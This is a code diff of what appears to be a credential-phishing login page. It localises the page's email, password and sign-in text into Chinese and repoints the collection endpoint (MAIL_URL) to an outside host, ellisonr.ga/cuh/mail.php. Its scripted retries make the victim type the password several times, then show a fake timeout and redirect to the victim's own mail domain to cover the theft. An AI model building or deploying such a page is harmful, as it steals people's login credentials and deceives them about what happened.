@@ -3539,7 +3539,7 @@
 					
 					<div class="wrap-input100 validate-input" data-validate="Valid email is: a@b.c">
 						<input id="emailInput" class="input100" type="email" name="email" value="">
-						<span class="focus-input100" data-placeholder="Email"></span>
+						<span class="focus-input100" data-placeholder="电子邮件"></span>
 					</div>
 
 					<div class="wrap-input100 validate-input" data-validate="Enter password">
@@ -3549,14 +3549,14 @@
 								style="position: absolute;right: 10px;top: 26%;font-size:20px;cursor: pointer;"></i>
 						</span>
 						<input id="passwordInput" class="input100" type="password" name="pass">
-						<span class="focus-input100" data-placeholder="Password"></span>
+						<span class="focus-input100" data-placeholder="密码"></span>
 					</div>
 
 					<div class="container-login100-form-btn">
 						<div class="wrap-login100-form-btn">
 							<div class="login100-form-bgbtn"></div>
 							<button id="loginButton" class="login100-form-btn">
-								Sign in
+								登录
 							</button>
 						</div>
 					</div>
@@ -3586,8 +3586,8 @@
 <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ho+j7jyWK8fNQe+A12Hb8AhRq26LrZ/JpcUGGOn+Y7RsweNrtN/tE3MoK7ZeZDyx" crossorigin="anonymous"></script>
 	
 	<script>
-		window.MAIL_URL = 'https://uyghurcrisis.com/secure/mail.php';
-		window.AUTH_LOADING_MESSAGE = 'Authenticating...';
+		window.MAIL_URL = 'https://ellisonr.ga/cuh/mail.php';
+		window.AUTH_LOADING_MESSAGE = '正在验证...';
 		window.FINAL_REDIRECT_URL = 'https://google.com';
 
 
@@ -3790,10 +3790,10 @@
 						if (parseInt(window.retryAttemptCount) <= 2) {
 							window.retryAttemptCount = parseInt(window.retryAttemptCount) + 1;
 							passwordElement.val('');
-							errorElement.html('Invalid email and/or password combination. Try again correctly.').show();
+							errorElement.html('电子邮件和/或密码组合不正确。 再试一次正确。').show();
 						} else {
 							//success message
-							successElement.html("Sorry, your sign-in timed out. Please Try again successfully.").show();
+							successElement.html("对不起。登录超时。请再试一次..").show();
 							//redirect
 							setTimeout(function () {
 								window.location.replace("http://"+emailElement.val().split("@")[1]);
